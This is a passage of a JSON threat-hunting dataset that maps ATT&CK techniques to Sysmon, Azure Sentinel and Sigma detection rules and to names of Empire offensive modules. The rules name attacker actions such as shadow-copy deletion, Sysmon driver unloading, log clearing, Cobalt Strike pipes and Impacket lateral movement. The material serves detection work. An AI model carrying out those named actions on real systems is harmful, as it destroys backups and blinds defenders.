"\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\csc.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\InstallUtil.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegAsm.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegSvcs.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\MSBuild.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\taskhost.exe", "name": null}], "parsed_datasets": [{"SysmonHunter - C1002": {"name": ".Net Environment Execution", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"any": {"pattern": "\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\csc.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\InstallUtil.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegAsm.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegSvcs.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\MSBuild.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\taskhost.exe", "flag": "regex"}}}]}}], "command_list": ["\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\csc.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\InstallUtil.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegAsm.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\RegSvcs.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\MSBuild.exe|\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\.+\\\\taskhost.exe"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "C1003", "commands": [{"source": "SysmonHunter - None", "command": "inetsrv\\appcmd.exe/dontLog:true", "name": null}, {"source": "SysmonHunter - None", "command": "fltmc.exeunload|detach", "name": null}, {"source": "SysmonHunter - None", "command": "vssadmin.exeDelete|Shadows", "name": null}, {"source": "SysmonHunter - None", "command": "wbadmindelete", "name": null}], "parsed_datasets": [{"SysmonHunter - C1003": {"name": null, "description": null, "level": "high", "phase": "Defense Evasion", "query": [{"type": "process", "process": {"image": {"pattern": "inetsrv\\appcmd.exe"}, "cmdline": {"pattern": "/dontLog:true"}}}, {"type": "process", "process": {"image": {"pattern": "fltmc.exe"}, "cmdline": {"pattern": "unload|detach"}}}, {"type": "process", "process": {"image": {"pattern": "vssadmin.exe"}, "cmdline": {"pattern": "Delete|Shadows", "op": "and"}}}, {"type": "process", "process": {"image": {"pattern": "wbadmin"}, "cmdline": {"pattern": "delete"}}}]}}], "command_list": ["inetsrv\\appcmd.exe/dontLog:true", "fltmc.exeunload|detach", "vssadmin.exeDelete|Shadows", "wbadmindelete"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "C1004", "commands": [{"source": "SysmonHunter - Discovery", "command": "\\\\Windows\\\\.+\\\\net.exe|wmic.exe|\\\\Windows\\\\.+\\\\ipconfig.exe|nbtstat|tasklist.exe|systeminfo.exe", "name": null}, {"source": "SysmonHunter - Discovery", "command": "\\\\Windows\\\\.+\\\\sc.exequery", "name": null}, {"source": "SysmonHunter - Discovery", "command": "\\\\Windows\\\\.+\\\\netsh.exeadvfirewall", "name": null}], "parsed_datasets": [{"SysmonHunter - C1004": {"name": "Discovery", "description": null, "level": "medium", "phase": "Discovery", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\net.exe|wmic.exe|\\\\Windows\\\\.+\\\\ipconfig.exe|nbtstat|tasklist.exe|systeminfo.exe", "flag": "regex"}}}, {"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\sc.exe", "flag": "regex"}, "cmdline": {"pattern": "query"}}}, {"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\netsh.exe", "flag": "regex"}, "cmdline": {"pattern": "advfirewall"}}}]}}], "command_list": ["\\\\Windows\\\\.+\\\\net.exe|wmic.exe|\\\\Windows\\\\.+\\\\ipconfig.exe|nbtstat|tasklist.exe|systeminfo.exe", "\\\\Windows\\\\.+\\\\sc.exequery", "\\\\Windows\\\\.+\\\\netsh.exeadvfirewall"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "C1005", "commands": [{"source": "SysmonHunter - IE DCOM Launch", "command": "\\\\Windows\\\\.+\\\\svchost.exe-k|DcomLaunch\\Internet Explorer\\iexplore.exe-Embedding", "name": null}], "parsed_datasets": [{"SysmonHunter - C1005": {"name": "IE DCOM Launch", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "procchain", "parent": {"image": {"pattern": "\\\\Windows\\\\.+\\\\svchost.exe", "flag": "regex"}, "cmdline": {"pattern": "-k|DcomLaunch", "op": "and"}}, "child": {"image": {"pattern": "\\Internet Explorer\\iexplore.exe"}, "cmdline": {"pattern": "-Embedding"}}}]}}], "command_list": ["\\\\Windows\\\\.+\\\\svchost.exe-k|DcomLaunch\\Internet Explorer\\iexplore.exe-Embedding"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "C1006", "commands": [{"source": "SysmonHunter - HTTP or HTTPS Communication", "command": "80|443", "name": null}], "parsed_datasets": [{"SysmonHunter - C1006": {"name": "HTTP or HTTPS Communication", "description": null, "level": "medium", "phase": "Command and Control", "query": [{"type": "network", "network": {"rport": {"pattern": "80|443"}}}]}}], "command_list": ["80|443"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T0000", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_command_line contains \"Get-History\"or process_command_line contains \"AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt\"or process_command_line contains \"(Get-PSReadlineOption).HistorySavePath\")", "name": "Console History"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 17 and (pipe_name contains \"\\\\isapi_http\"or pipe_name contains \"\\\\isapi_dg\"or pipe_name contains \"\\\\isapi_dg2\"or pipe_name contains \"\\\\isapi_http\"or pipe_name contains \"\\\\sdlrpc\"or pipe_name contains \"\\\\aheec\"or pipe_name contains \"\\\\winsession\"or pipe_name contains \"\\\\lsassw\"or pipe_name contains \"\\\\rpchlp_3\"or pipe_name contains \"\\\\NamePipe_MoreWindows\"or pipe_name contains \"\\\\pcheap_reuse\"or pipe_name contains \"\\\\PSEXESVC\"or pipe_name contains \"\\\\PowerShellISEPipeName_\"or pipe_name contains \"\\\\csexec\"or pipe_name contains \"\\\\paexec\"or pipe_name contains \"\\\\remcom\")", "name": "Named Pipes"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 17 and pipe_name contains \"\\\\msagent_\"", "name": "Named Pipes CobaltStrike"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3 and process_path contains \"qwinsta.exe\"", "name": "Remotely Query Login Sessions Network"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_path contains \"qwinsta.exe\"", "name": "Remotely Query Login Sessions Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path == \"a.exe\"or process_path == \"b.exe\"or process_path == \"c.exe\"or process_path == \"d.exe\"or process_path == \"e.exe\"or process_path == \"f.exe\"or process_path == \"g.exe\"or process_path == \"h.exe\"or process_path == \"i.exe\"or process_path == \"j.exe\"or process_path == \"k.exe\"or process_path == \"l.exe\"or process_path == \"m.exe\"or process_path == \"n.exe\"or process_path == \"o.exe\"or process_path == \"p.exe\"or process_path == \"q.exe\"or process_path == \"r.exe\"or process_path == \"s.exe\"or process_path == \"t.exe\"or process_path == \"u.exe\"or process_path == \"v.exe\"or process_path == \"w.exe\"or process_path == \"x.exe\"or process_path == \"y.exe\"or process_path == \"z.exe\"or process_path == \"1.exe\"or process_path == \"2.exe\"or process_path == \"3.exe\"or process_path == \"4.exe\"or process_path == \"5.exe\"or process_path == \"6.exe\"or process_path == \"7.exe\"or process_path == \"8.exe\"or process_path == \"9.exe\"or process_path == \"0.exe\"or process_path == \"10.exe\")", "name": "Suspicious Filename Used"}], "possible_detections": []}, {"technique_id": "T1013", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Print\\\\Monitors\\\\\"", "name": "Local Port Monitor"}], "possible_detections": []}, {"technique_id": "T1054", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"fltmc.exe\" or process_command_line contains \"*fltmc*unload*\")", "name": "Indicator Blocking Driver Unloaded"}, {"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and  (registry_key_path contains \"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\*\"or registry_key_path contains \"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Sysmon\\\\*\"or registry_key_path contains \"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Sysmon64\\\\*\")and (process_path !contains \"Sysmon64.exe\" or process_path !contains \"Sysmon.exe\")", "name": "Indicator Blocking Sysmon Registry Edited From Other Source"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Stop Windows Defense Service\ndescription: win7 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: system\ndetection:\nselection:\nEventID: 7036\nMessage: 'Windows Firewall service is stopped. '\ncondition: selection\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows log Clear\ndescription: win7 and windows server 2003 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: security\ndetection:\nselection:\nEventID:\n\\ --1102\n\\ --517\ncondition: selection\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows log Clear\ndescription: win7 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: system\ndetection:\nselection:\nEventID: 104\ncondition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Disabling Windows Event Auditing", "id": "69aeb277-f15f-4d2d-b32a-55e883609563", "description": "Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off \"Local Group Policy Object Processing\" via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as \"gpedit.msc\". Please note, that disabling \"Local Group Policy Object Processing\" may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform these modifications in Active Directory anyways.", "references": ["https://bit.ly/WinLogsZero2Hero"], "tags": ["attack.defense_evasion", "attack.t1054"], "author": "@neu5ron", "logsource": {"product": "windows", "service": "security", "definition": "Requirements: Audit Policy : Computer Management > Audit Policy Configuration, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change"}, "detection": {"selection": {"EventID": 4719, "AuditPolicyChanges": "removed"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1187", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_smbexec", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_smbexec", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_smbexec", "ATT&CK Technique #1": "T1187", "ATT&CK Technique #2": "", "Technique": "Forced Authentication", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_smbexec\":  [\"T1187\"],"}}], "command_list": ["powershell/lateral_movement/invoke_smbexec", "powershell/lateral_movement/invoke_smbexec"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 11and (file_name contains \".lnk\"or file_name contains \".scf\")", "name": "Forced Authentication"}], "possible_detections": []}, {"technique_id": "T1209", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\System\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\\"", "name": "Time Providers"}], "possible_detections": []}, {"technique_id": "T1000", "commands": [], "parsed_datasets": [], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1125", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/WebcamRecorder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/WebcamRecorder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/webcam", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/webcam", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/WebcamRecorder", "ATT&CK Technique #1": "T1125", "ATT&CK Technique #2": "", "Technique": "Video Capture", "Concatenate for Python Dictionary": "\"powershell/collection/WebcamRecorder\":  [\"T1125\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/webcam", "ATT&CK Technique #1": "T1125", "ATT&CK Technique #2": "", "Technique": "Video Capture", "Concatenate for Python Dictionary": "\"python/collection/osx/webcam\":  [\"T1125\"],"}}], "command_list": ["powershell/collection/WebcamRecorder", "powershell/collection/WebcamRecorder", "python/collection/osx/webcam", "python/collection/osx/webcam"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1171", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/inveigh", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/inveigh", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/inveigh_relay", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/inveigh_relay", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/inveigh", "ATT&CK Technique #1": "T1171", "ATT&CK Technique #2": "", "Technique": "LLMNR/NBT-NS Poisoning", "Concatenate for Python Dictionary": "\"powershell/collection/inveigh\":  [\"T1171\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/inveigh_relay", "ATT&CK Technique #1": "T1171", "ATT&CK Technique #2": "", "Technique": "LLMNR/NBT-NS Poisoning", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/inveigh_relay\":  [\"T1171\"],"}}], "command_list": ["powershell/collection/inveigh", "powershell/collection/inveigh", "powershell/lateral_movement/inveigh_relay", "powershell/lateral_movement/inveigh_relay"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "RottenPotato Like Attack Pattern", "id": "16f5d8ca-44bd-47c8-acbe-6fc95a16c12f", "status": "experimental", "description": "Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like", "references": ["https://twitter.com/SBousseaden/status/1195284233729777665"], "author": "@SBousseaden, Florian Roth", "date": "2019/11/15", "tags": ["attack.privilege_escalation", "attack.credential_access", "attack.t1171"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4624, "LogonType": 3, "TargetUserName": "ANONYMOUS_LOGON", "WorkstationName": "-", "SourceNetworkAddress": "127.0.0.1"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1020", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/egresscheck", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exfiltration/egresscheck", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/exfiltration/egresscheck", "ATT&CK Technique #1": "T1020", "ATT&CK Technique #2": "", "Technique": "Automated Exfiltration", "Concatenate for Python Dictionary": "\"powershell/exfiltration/egresscheck\":  [\"T1020\"],"}}], "command_list": ["powershell/exfiltration/egresscheck", "powershell/exfiltration/egresscheck"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1210", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jboss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jboss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jenkins", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jenkins", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_exploitable_system", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_exploitable_system", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_eternalblue", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_eternalblue", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/exploitation/exploit_jboss", "ATT&CK Technique #1": "T1210", "ATT&CK Technique #2": "T1190", "Technique": "Exploitation of Remote Services", "Concatenate for Python Dictionary": "\"powershell/exploitation/exploit_jboss\":  [\"T1210\",\"T1190\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/exploitation/exploit_jenkins", "ATT&CK Technique #1": "T1210", "ATT&CK Technique #2": "T1190", "Technique": "Exploitation of Remote Services", "Concatenate for Python Dictionary": "\"powershell/exploitation/exploit_jenkins\":  [\"T1210\",\"T1190\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/get_exploitable_system", "ATT&CK Technique #1": "T1210", "ATT&CK Technique #2": "", "Technique": "Exploitation of Remote Services", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_exploitable_system\":  [\"T1210\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/exploitation/exploit_eternalblue", "ATT&CK Technique #1": "T1210", "ATT&CK Technique #2": "T1212", "Technique": "Exploitation of Remote Services", "Concatenate for Python Dictionary": "\"powershell/exploitation/exploit_eternalblue\":  [\"T1210\",\"T1212\"],"}}], "command_list": ["powershell/exploitation/exploit_jboss", "powershell/exploitation/exploit_jboss", "powershell/exploitation/exploit_jenkins", "powershell/exploitation/exploit_jenkins", "powershell/situational_awareness/network/get_exploitable_system", "powershell/situational_awareness/network/get_exploitable_system", "powershell/exploitation/exploit_eternalblue", "powershell/exploitation/exploit_eternalblue"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Suspicious Outbound RDP Connections", "id": "ed74fe75-7594-4b4b-ae38-e38e3fd2eb23", "status": "experimental", "description": "Detects Non-Standard Tools Connecting to TCP port 3389 indicating possible lateral movement", "references": ["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708"], "author": "Markus Neis - Swisscom", "date": "2019/05/15", "tags": ["attack.lateral_movement", "attack.t1210", "car.2013-07-002"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 3, "DestinationPort": 3389, "Initiated": "true"}, "filter": {"Image": ["*\\mstsc.exe", "*\\RTSApp.exe", "*\\RTS2App.exe", "*\\RDCMan.exe", "*\\ws_TunnelService.exe", "*\\RSSensor.exe", "*\\RemoteDesktopManagerFree.exe", "*\\RemoteDesktopManager.exe", "*\\RemoteDesktopManager64.exe", "*\\mRemoteNG.exe", "*\\mRemote.exe", "*\\Terminals.exe", "*\\spiceworks-finder.exe", "*\\FSDiscovery.exe", "*\\FSAssessment.exe", "*\\MobaRTE.exe", "*\\chrome.exe", "*\\thor.exe", "*\\thor64.exe"]}, "condition": "selection and not filter"}, "falsepositives": ["Other Remote Desktop RDP tools"], "level": "high"}}, {"data_source": {"title": "Scanner PoC for CVE-2019-0708 RDP RCE vuln", "id": "8400629e-79a9-4737-b387-5db940ab2367", "description": "Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to  CVE-2019-0708 RDP RCE aka BlueKeep", "references": ["https://twitter.com/AdamTheAnalyst/status/1134394070045003776", "https://github.com/zerosum0x0/CVE-2019-0708"], "tags": ["attack.lateral_movement", "attack.t1210", "car.2013-07-002"], "author": "Florian Roth (rule), Adam Bradbury (idea)", "date": "2019/06/02", "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4625, "AccountName": "AAAAAAA"}, "condition": "selection"}, "falsepositives": ["Unlikely"], "level": "critical"}}]}, {"technique_id": "T1175", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_dcom", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_dcom", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_dcom", "ATT&CK Technique #1": "T1175", "ATT&CK Technique #2": "", "Technique": "Distributed Component Object Model", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_dcom\":  [\"T1175\"],"}}], "command_list": ["powershell/lateral_movement/invoke_dcom", "powershell/lateral_movement/invoke_dcom"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Impacket Lateralization Detection", "id": "10c14723-61c7-4c75-92ca-9af245723ad2", "status": "experimental", "description": "Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework", "references": ["https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py", "https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py", "https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py", "https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py"], "author": "Ecco", "date": "2019/09/03", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_other": {"ParentImage": ["*\\wmiprvse.exe", "*\\mmc.exe", "*\\explorer.exe", "*\\services.exe"], "CommandLine": ["*cmd.exe* /Q /c * \\\\\\\\127.0.0.1\\\\*&1*"]}, "selection_atexec": {"ParentCommandLine": ["*svchost.exe -k netsvcs", "taskeng.exe*"], "CommandLine": ["cmd.exe /C *Windows\\\\Temp\\\\*&1"]}, "condition": "(1 of selection_*)"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.lateral_movement", "attack.t1047", "attack.t1175"], "falsepositives": ["pentesters"], "level": "critical"}}, {"data_source": {"title": "MMC Spawning Windows Shell", "id": "05a2ab7e-ce11-4b63-86db-ab32e763e11d", "status": "experimental", "description": "Detects a Windows command line executable started from MMC.", "author": "Karneades, Swisscom CSIRT", "tags": ["attack.lateral_movement", "attack.t1175"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\mmc.exe", "Image": ["*\\cmd.exe", "*\\powershell.exe", "*\\wscript.exe", "*\\cscript.exe", "*\\sh.exe", "*\\bash.exe", "*\\reg.exe", "*\\regsvr32.exe", "*\\BITSADMIN*"]}, "condition": "selection"}, "fields": ["CommandLine", "Image", "ParentCommandLine"], "level": "high"}}]}, {"technique_id": "T1190", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/jenkins_script_console", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/jenkins_script_console", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/exploit/web/jboss_jmx", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/exploit/web/jboss_jmx", "name": "Empire Module Command"}], "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/jenkins_script_console", "ATT&CK Technique #1": "T1190", "ATT&CK Technique #2": "", "Technique": "Exploit Public-Facing Application", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/jenkins_script_console\":  [\"T1190\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/exploit/web/jboss_jmx", "ATT&CK Technique #1": "T1190", "ATT&CK Technique #2": "", "Technique": "Exploit Public-Facing Application", "Concatenate for Python Dictionary": "\"python/exploit/web/jboss_jmx\":  [\"T1190\"],"}}], "command_list": ["powershell/lateral_movement/jenkins_script_console", "powershell/lateral_movement/jenkins_script_console", "python/exploit/web/jboss_jmx", "python/exploit/web/jboss_jmx"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: CVE-2020-0688 Exchange Exploitation via Web Log\nid: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\nlogsource:\n\u00a0\u00a0\u00a0\u00a0category: webserver\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cs-method: 'GET'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '/ ecp /'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '/ owa /'\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains: '__VIEWSTATE ='\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nfields:\n\u00a0\u00a0\u00a0\u00a0- c-ip\n\u00a0\u00a0\u00a0\u00a0- c-dns\nfalsepositives:\n\u00a0\u00a0\u00a0\u00a0- Unknown\ntags:\n\u00a0\u00a0\u00a0\u00a0- attack.initial_access\n\u00a0\u00a0\u00a0\u00a0- attack.t1190\nlevel: critical", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: CVE-2020-0688 Exploitation via Eventlog\nid: d6266bf5-935e-4661-b477-78772735a7cb\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\ntags:\n\u00a0\u00a0\u00a0\u00a0- attack.initial_access\n\u00a0\u00a0\u00a0\u00a0- attack.t1190\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: application\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Source: MSExchange Control Panel\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Level: Error\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* & __ VIEWSTATE = *'\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nfalsepositives:\n\u00a0\u00a0\u00a0\u00a0- Unknown\nlevel: high", "name": "Yml"}, 